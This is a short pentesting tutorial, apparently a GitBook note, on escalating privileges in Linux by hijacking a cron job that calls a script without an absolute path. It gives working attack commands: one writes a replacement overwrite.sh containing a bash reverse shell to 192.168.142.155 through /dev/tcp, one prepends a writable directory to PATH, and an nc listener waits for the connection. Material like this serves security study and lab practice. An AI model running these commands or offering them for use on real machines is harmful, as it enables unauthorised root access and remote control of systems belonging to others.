# PATH environment abuse

The crontab PATH environment variable is by default set to /usr/bin:/bin. The PATH variable can be overwritten in the crontab file. If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

{% code overflow="wrap" %}
```bash
cat /etc/cron
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

There is no absolute path to run the overwrite.sh. You can add an additional PATH environment and create a new 'overwrite.sh' to run.&#x20;

{% code overflow="wrap" %}
```bash
# Target machine 
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.142.155/54 0>&1' > /home/bla/overwrite.sh

export PATH=/home/bla:$PATH
```
{% endcode %}

Run nc and wait for a victim machine to run the cron job.

{% code overflow="wrap" %}
```bash
nc -nlvp 54
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
